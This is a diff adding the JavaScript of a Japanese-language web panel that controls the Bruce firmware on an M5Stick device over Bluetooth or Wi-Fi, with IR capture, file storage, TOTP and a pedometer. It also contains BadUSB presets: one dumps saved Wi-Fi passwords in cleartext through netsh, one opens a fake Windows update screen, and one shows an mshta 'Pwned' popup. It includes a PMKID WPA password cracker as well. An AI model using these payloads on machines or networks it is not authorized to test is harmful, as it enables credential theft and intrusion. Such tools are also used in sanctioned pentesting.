+                disconnectBLE();
+            } else {
+                await connectBLE();
+            }
+        }
+
+        async function connectBLE() {
+            if (!navigator.bluetooth) {
+                alert('お使いのブラウザは Web Bluetooth に対応していません。\nGoogle Chrome / Microsoft Edge / Bluefy (iOS) 等をお使いください。');
+                return;
+            }
+
+            try {
+                appendCliLog('[*] BLEデバイスをスキャン中... (Bruce を選択してください)');
+                
+                bleDevice = await navigator.bluetooth.requestDevice({
+                    filters: [
+                        { namePrefix: 'Bruc' },
+                        { name: 'Bruce' },
+                        { services: [BRUCE_SERVICE_UUID] }
+                    ],
+                    optionalServices: [
+                        BRUCE_SERVICE_UUID,
+                        'battery_service',
+                        BATTERY_SERVICE_UUID
+                    ]
+                });
+
+                bleDevice.addEventListener('gattserverdisconnected', onBleDisconnected);
+
+                appendCliLog(`[+] 接続中: ${bleDevice.name || 'Bruce'}...`);
+                bleServer = await bleDevice.gatt.connect();
+
+                // Setup Serial Service
+                const serialService = await bleServer.getPrimaryService(BRUCE_SERVICE_UUID);
+                bleSerialChar = await serialService.getCharacteristic(BRUCE_CHAR_UUID);
+
+                await bleSerialChar.startNotifications();
+                bleSerialChar.addEventListener('characteristicvaluechanged', onBleSerialReceived);
+
+                appendCliLog('✅ BLE Serial 接続完了！ (双方向通信可能)');
+
+                // Battery Service
+                try {
+                    const batService = await bleServer.getPrimaryService('battery_service');
+                    bleBatteryChar = await batService.getCharacteristic('battery_level');
+                    const batVal = await bleBatteryChar.readValue();
+                    updateBatteryDisplay(batVal.getUint8(0));
+
+                    await bleBatteryChar.startNotifications();
+                    bleBatteryChar.addEventListener('characteristicvaluechanged', (e) => {
+                        updateBatteryDisplay(e.target.value.getUint8(0));
+                    });
+                } catch (e) {}
+
+                updateBleUiState();
+                sendCli('uptime');
+            } catch (err) {
+                appendCliLog(`❌ BLE接続エラー: ${err.message || err}`);
+                updateBleUiState();
+            }
+        }
+
+        function disconnectBLE() {
+            if (bleDevice && bleDevice.gatt.connected) {
+                bleDevice.gatt.disconnect();
+            }
+            onBleDisconnected();
+        }
+
+        function onBleDisconnected() {
+            bleSerialChar = null;
+            bleBatteryChar = null;
+            appendCliLog('[-] BLE切断されました。');
+            updateBleUiState();
+        }
+
+        function updateBleUiState() {
+            const isConnected = bleDevice && bleDevice.gatt && bleDevice.gatt.connected;
+            const dot = document.getElementById('status-dot');
+            const stateText = document.getElementById('conn-state-text');
+            const btn = document.getElementById('btn-ble-connect');
+            const batPill = document.getElementById('bat-pill');
+
+            if (isConnected) {
+                dot.classList.add('connected');
+                stateText.textContent = bleDevice.name || 'Bruce BLE';
+                btn.textContent = '🔌 BLE切断';
+                btn.classList.remove('btn-secondary');
+                btn.classList.add('btn-outline');
+            } else {
+                dot.classList.remove('connected');
+                stateText.textContent = '未接続';
+                btn.textContent = '📡 Bruce にBLE接続';
+                btn.classList.remove('btn-outline');
+                btn.classList.add('btn-secondary');
+                batPill.style.display = 'none';
+            }
+        }
+
+        function updateBatteryDisplay(level) {
+            const batPill = document.getElementById('bat-pill');
+            const batVal = document.getElementById('bat-val');
+            batVal.textContent = `${level}%`;
+            batPill.style.display = 'inline-flex';
+        }
+
+        function onBleSerialReceived(event) {
+            const value = event.target.value;
+            const text = new TextDecoder('utf-8').decode(value);
+            appendCliLog(text, false);
+        }
+
+        async function sendBleText(text) {
+            if (!bleSerialChar) {
+                alert('BLEが接続されていません。「Bruce にBLE接続」を押してください。');
+                return;
+            }
+            const data = new TextEncoder().encode(text.endsWith('\n') ? text : text + '\n');
+            await bleSerialChar.writeValueWithResponse(data);
+        }
+
+        // --- Unified CLI Dispatcher ---
+        async function sendCli(cmd) {
+            appendCliLog(`\n> ${cmd}\n`);
+            if (connMode === 'ble' && bleSerialChar) {
+                await sendBleText(cmd);
+            } else {
+                // Wi-Fi REST fallback
+                try {
+                    await fetch(`${getBaseUrl()}/api/command`, {
+                        method: 'POST',
+                        body: cmd
+                    });
+                } catch (e) {
+                    appendCliLog(`[!] Wi-Fi送信エラー (REST API未接続)`);
+                }
+            }
+        }
+
+        function executeCustomCli() {
+            const input = document.getElementById('cli-input');
+            const val = input.value.trim();
+            if (!val) return;
+            sendCli(val);
+            input.value = '';
+        }
+
+        function appendCliLog(text, newLine = true) {
+            const log = document.getElementById('cli-log');
+            log.textContent += text + (newLine ? '\n' : '');
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function clearCliLog() {
+            document.getElementById('cli-log').textContent = '';
+        }
+
+        // --- Navigation Pad ---
+        function sendNav(dir) {
+            sendCli(`nav ${dir}`);
+        }
+
+        // Keyboard Arrow bindings
+        window.addEventListener('keydown', (e) => {
+            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(document.activeElement.tagName)) return;
+            if (e.key === 'ArrowUp') { e.preventDefault(); sendNav('up'); }
+            else if (e.key === 'ArrowDown') { e.preventDefault(); sendNav('down'); }
+            else if (e.key === 'ArrowLeft') { e.preventDefault(); sendNav('prev'); }
+            else if (e.key === 'ArrowRight') { e.preventDefault(); sendNav('next'); }
+            else if (e.key === 'Enter') { e.preventDefault(); sendNav('sel'); }
+            else if (e.key === 'Escape' || e.key === 'Backspace') { e.preventDefault(); sendNav('esc'); }
+        });
+
+        // Brightness slider
+        function onBrightnessChange(val) {
+            const pct = Math.round((val / 255) * 100);
+            document.getElementById('br-val-text').textContent = `${pct}%`;
+            sendCli(`led br ${val}`);
+        }
+
+        // --- Wi-Fi REST Logic ---
+        function getBaseUrl() {
+            const val = document.getElementById('device-ip').value.trim();
+            return `http://${val}`;
+        }
+
+        async function checkWifiConnection() {
+            const dot = document.getElementById('status-dot');
+            const stateText = document.getElementById('conn-state-text');
+            try {
+                const res = await fetch(`${getBaseUrl()}/sensors`, { method: 'GET', mode: 'cors' });
+                if (res.ok) {
+                    dot.classList.add('connected');
+                    stateText.textContent = 'Wi-Fi 接続中';
+                    fetchTotpList();
+                    fetchPedometerData();
+                } else {
+                    dot.classList.remove('connected');
+                    stateText.textContent = '未接続';
+                }
+            } catch (err) {
+                dot.classList.remove('connected');
+                stateText.textContent = '未接続';
+            }
+        }
+
+        // --- Tab Switcher ---
+        function switchTab(tabId) {
+            document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+            const tabMap = {
+                'remote-pad': 1,
+                'live-trans': 2,
+                'rf-ir': 3,
+                'wireless': 4,
+                'badusb': 5,
+                'storage': 6,
+                'totp-ped': 7,
+                'terminal': 8
+            };
+
+            const index = tabMap[tabId] || 1;
+            document.querySelector(`nav button:nth-child(${index})`)?.classList.add('active');
+            document.getElementById(`tab-${tabId}`)?.classList.add('active');
+
+            if (tabId === 'totp-ped' && connMode === 'wifi') { fetchTotpList(); fetchPedometerData(); }
+            if (tabId === 'rf-ir' && connMode === 'wifi') fetchIrData();
+            if (tabId === 'storage') fetchStorageList('/');
+        }
+
+        // --- Live Caption Functions ---
+        async function sendManualCaption() {
+            const input = document.getElementById('manual-caption-input');
+            const text = input.value.trim();
+            if (!text) return;
+
+            const logBox = document.getElementById('trans-log-box');
+            logBox.textContent += `\n[送信] ${text}`;
+            logBox.scrollTop = logBox.scrollHeight;
+
+            if (connMode === 'ble' && bleSerialChar) {
+                await sendBleText(`caption ${text}`);
+            } else {
+                try {
+                    await fetch(`${getBaseUrl()}/api/display/frame`, { method: 'POST', body: text });
+                } catch (e) {}
+            }
+            input.value = '';
+        }
+
+        // --- IR Sniffer & Canvas ---
+        let currentIrPulses = [];
+        async function fetchIrData() {
+            try {
+                const res = await fetch(`${getBaseUrl()}/api/ir/sniffer`, { method: 'GET', mode: 'cors' });
+                const data = await res.json();
+                document.getElementById('ir-pulse-count').textContent = data.count || 0;
+                document.getElementById('ir-raw-ticks').textContent = data.rawTicks || 0;
+                currentIrPulses = data.pulses || [];
+                drawIrWaveform(currentIrPulses);
+            } catch (err) {}
+        }
+
+        function drawIrWaveform(pulses) {
+            const canvas = document.getElementById('ir-canvas');
+            const ctx = canvas.getContext('2d');
+            const w = canvas.width;
+            const h = canvas.height;
+
+            ctx.fillStyle = '#08090f';
+            ctx.fillRect(0, 0, w, h);
+
+            if (!pulses || pulses.length === 0) {
+                ctx.fillStyle = '#6b7280';
+                ctx.font = '12px monospace';
+                ctx.textAlign = 'center';
+                ctx.fillText('No IR signal captured yet. Press button on remote.', w / 2, h / 2 + 4);
+                return;
+            }
+
+            const totalUs = pulses.reduce((a, b) => a + b, 0);
+            if (totalUs <= 0) return;
+
+            ctx.strokeStyle = '#1e2336';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.moveTo(0, h * 0.25); ctx.lineTo(w, h * 0.25);
+            ctx.moveTo(0, h * 0.75); ctx.lineTo(w, h * 0.75);
+            ctx.stroke();
+
+            ctx.strokeStyle = '#00ff9d';
+            ctx.lineWidth = 2;
+            ctx.beginPath();
+
+            let currentX = 0;
+            const highY = h * 0.25;
+            const lowY = h * 0.75;
+            ctx.moveTo(0, highY);
+
+            for (let i = 0; i < pulses.length; i++) {
+                const segW = (pulses[i] / totalUs) * w;
+                const nextX = currentX + segW;
+                const y = (i % 2 === 0) ? highY : lowY;
+                ctx.lineTo(currentX, y);
+                ctx.lineTo(nextX, y);
+                currentX = nextX;
+            }
+            ctx.stroke();
+        }
+
+        async function replayIr(invert = false) {
+            sendCli(invert ? 'ir tx_raw invert' : 'ir tx_raw');
+        }
+
+        async function armIrCapture() {
+            sendCli('ir rx');
+            setTimeout(fetchIrData, 500);
+        }
+
+        async function saveIrToDevice() {
+            const name = document.getElementById('ir-save-name').value.trim() || 'remote';
+            sendCli(`ir save ${name}`);
+            alert(`✅ /BruceIR/${name}.ir として保存コマンドを送信しました！`);
+        }
+
+        function downloadIrFile() {
+            if (!currentIrPulses || currentIrPulses.length === 0) {
+                alert('ダウンロードする赤外線データがありません。');
+                return;
+            }
+            const name = document.getElementById('ir-save-name').value.trim() || 'remote';
+            let content = `Filetype: IR library file\nVersion: 1\n#\nname: ${name}\ntype: raw\nfrequency: 38000\nduty_cycle: 0.330000\ndata: ${currentIrPulses.join(' ')}\n#\n`;
+            const blob = new Blob([content], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `${name}.ir`;
+            a.click();
+        }
+
+        // --- BadUSB Ducky Preset & Run ---
+        const DUCKY_PRESETS = {
+            wifi_dump: "GUI r\nDELAY 200\nSTRING cmd /k netsh wlan show profiles & netsh wlan show profile name=* key=clear\nENTER",
+            fake_update: "GUI r\nDELAY 200\nSTRING https://fakeupdate.net/win10ue/\nENTER\nDELAY 1000\nF11",
+            rickroll: "GUI r\nDELAY 200\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
+            lock: "GUI l",
+            msgbox: "GUI r\nDELAY 200\nSTRING mshta vbscript:msgbox(\"Pwned by Bruce M5Stick!\",64,\"Security Alert\")(window.close)\nENTER"
+        };
+
+        function loadDuckyPreset(preset) {
+            if (DUCKY_PRESETS[preset]) {
+                document.getElementById('ducky-code').value = DUCKY_PRESETS[preset];
+            }
+        }
+
+        function executeDuckyScript() {
+            const code = document.getElementById('ducky-code').value.trim();
+            if (!code) { alert('DuckyScript を入力してください。'); return; }
+            sendCli(`badusb run ${code.replace(/\n/g, ' ')}`);
+            alert('🚀 BadUSB タイピングコマンドを送信しました！');
+        }
+
+        function saveDuckyToBruce() {
+            const name = prompt('保存ファイル名を入力してください (例: payload.txt):', 'payload.txt');
+            if (!name) return;
+            const code = document.getElementById('ducky-code').value;
+            sendCli(`storage write /BruceBadUSB/${name} ${code}`);
+            alert(`💾 /BruceBadUSB/${name} に保存しました！`);
+        }
+
+        // --- Storage Explorer ---
+        async function fetchStorageList(dir = '/') {
+            const container = document.getElementById('file-list-container');
+            container.innerHTML = `<div style="color: var(--text-dim); text-align: center; padding: 12px;">📂 ${dir} をスキャン中...</div>`;
+            sendCli(`ls ${dir}`);
+        }
+
+        function readStorageFile() {
+            const path = document.getElementById('storage-file-path').value.trim();
+            if (!path) return;
+            sendCli(`cat ${path}`);
+            switchTab('terminal');
+        }
+
+        function deleteStorageFile() {
+            const path = document.getElementById('storage-file-path').value.trim();
+            if (!path) return;
+            if (!confirm(`${path} を削除しますか？`)) return;
+            sendCli(`rm ${path}`);
+        }
+
+        // --- TOTP & Pedometer ---
+        async function fetchTotpList() {
+            const container = document.getElementById('totp-list');
+            try {
+                const res = await fetch(`${getBaseUrl()}/api/totp`, { method: 'GET', mode: 'cors' });
+                const list = await res.json();
+                if (!list || list.length === 0) {
+                    container.innerHTML = '<p style="color: var(--text-dim); text-align: center; padding: 12px;">アカウントがありません。</p>';
+                    return;
+                }
+                container.innerHTML = list.map(item => `
+                    <div class="totp-item">
+                        <div>
+                            <div style="font-weight: 700; font-size: 0.9rem;">${item.name}</div>
+                            <div class="totp-code">${item.code}</div>
+                            <div style="font-size: 0.72rem; color: var(--text-dim);">残り: ${item.seconds_left} 秒</div>
+                            <div class="progress-bar-wrap">
+                                <div class="progress-bar-fill" style="width: ${(item.seconds_left / item.period) * 100}%;"></div>
+                            </div>
+                        </div>
+                        <button class="btn btn-outline" style="width: auto; padding: 5px 8px; color: var(--danger);" onclick="deleteTotp(${item.index})">削除</button>
+                    </div>
+                `).join('');
+            } catch (err) {
+                container.innerHTML = '<p style="color: var(--danger); text-align: center; padding: 12px;">Wi-Fi 接続待機中</p>';
+            }
+        }
+
+        async function deleteTotp(idx) {
+            if (!confirm('削除しますか？')) return;
+            try {
+                await fetch(`${getBaseUrl()}/api/totp?delete=1&index=${idx}`, { method: 'POST', mode: 'cors' });
+                fetchTotpList();
+            } catch (err) {}
+        }
+
+        function toggleQrScanner() {
+            const btn = document.getElementById('btn-scan');
+            const readerDiv = document.getElementById('qr-reader');
+
+            if (qrScanning) {
+                if (html5QrCode) {
+                    html5QrCode.stop().then(() => {
+                        readerDiv.style.display = 'none';
+                        btn.textContent = '📷 QRコードで一発登録';
+                        qrScanning = false;
+                    });
+                }
+            } else {
+                readerDiv.style.display = 'block';
+                html5QrCode = new Html5Qrcode("qr-reader");
+                html5QrCode.start(
+                    { facingMode: "environment" },
+                    { fps: 10, qrbox: 250 },
+                    async (decodedText) => {
+                        if (decodedText.startsWith("otpauth://")) {
+                            btn.textContent = '登録中...';
+                            html5QrCode.stop();
+                            readerDiv.style.display = 'none';
+                            qrScanning = false;
+                            
+                            const params = new URLSearchParams();
+                            params.append('uri', decodedText);
+                            await fetch(`${getBaseUrl()}/api/totp`, {
+                                method: 'POST',
+                                mode: 'cors',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: params.toString()
+                            });
+                            alert('✅ TOTP アカウントを登録しました！');
+                            btn.textContent = '📷 QRコードで一発登録';
+                            fetchTotpList();
+                        }
+                    },
+                    () => {}
+                ).then(() => {
+                    btn.textContent = 'スキャン停止';
+                    qrScanning = true;
+                });
+            }
+        }
+
+        async function fetchPedometerData() {
+            try {
+                const res = await fetch(`${getBaseUrl()}/api/pedometer`, { method: 'GET', mode: 'cors' });
+                const data = await res.json();
+                document.getElementById('ped-steps').textContent = data.steps;
+                document.getElementById('ped-dist').textContent = `${data.distance_m.toFixed(1)} m`;
+                document.getElementById('ped-cal').textContent = `${data.calories_kcal.toFixed(1)} kcal`;
+                document.getElementById('ped-status').textContent = data.bg_active ? 'ACTIVE' : 'STOPPED';
+            } catch (err) {}
+        }
+
+        async function resetPedometer() {
+            if (!confirm('歩数をゼロにリセットしますか？')) return;
+            sendCli('pedometer reset');
+            setTimeout(fetchPedometerData, 500);
+        }
+
+        // --- Offload Cracker ---
+        async function startOffloadCrack() {
+            const ssid = document.getElementById('crack-ssid').value.trim();
+            const apMac = document.getElementById('crack-ap-mac').value.trim();
+            const staMac = document.getElementById('crack-sta-mac').value.trim();
+            const pmkid = document.getElementById('crack-pmkid').value.trim();
+            const fileInput = document.getElementById('crack-wordlist-file');
+            const logBox = document.getElementById('crack-log');
+
+            if (!ssid || !apMac || !staMac || !pmkid) {
+                alert('SSID、MACアドレス、PMKIDを入力してください。');
+                return;
+            }
+
+            let wordlist = ["12345678", "password", "password123", "admin123", "letmein1", "test1234", "11112222", "88888888"];
+            if (fileInput.files.length > 0) {
+                const text = await fileInput.files[0].text();
+                wordlist = text.split(/\r?\n/).filter(line => line.length >= 8);
+            }
+
+            logBox.textContent = `[+] オフロード解読を開始 (ワード数: ${wordlist.length})...\n`;
+
+            if (crackerWorker) crackerWorker.terminate();
+            crackerWorker = new Worker('cracker_worker.js');
+
+            crackerWorker.postMessage({
+                type: 'CRACK_PMKID',
+                payload: { ssid, apMac, clientMac: staMac, pmkidHex: pmkid, wordlist }
+            });
+
+            crackerWorker.onmessage = function(e) {
+                const { type, payload } = e.data;
+                if (type === 'PROGRESS') {
+                    logBox.textContent += `[*] 進捗: ${payload.tested}/${payload.total} (${payload.speed} h/s)\n`;
+                    logBox.scrollTop = logBox.scrollHeight;
+                } else if (type === 'FOUND') {
+                    logBox.textContent += `\n🎉 【パスワード解読成功】: ${payload.password}\n⏱️ 所要時間: ${payload.timeMs} ms\n`;
+                    logBox.scrollTop = logBox.scrollHeight;
+                } else if (type === 'NOT_FOUND') {
+                    logBox.textContent += `\n[-] パスワードが見つかりませんでした\n`;
+                    logBox.scrollTop = logBox.scrollHeight;
+                }
+            };
+        }
+
+        // Periodic Refresh
+        setInterval(() => {
+            const activeTab = document.querySelector('.tab-content.active')?.id;
+            if (activeTab === 'tab-live-trans') {
+                const img = document.getElementById('trans-preview-img');
+                if (img) img.src = `../lfm_audio/preview.png?t=${Date.now()}`;
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
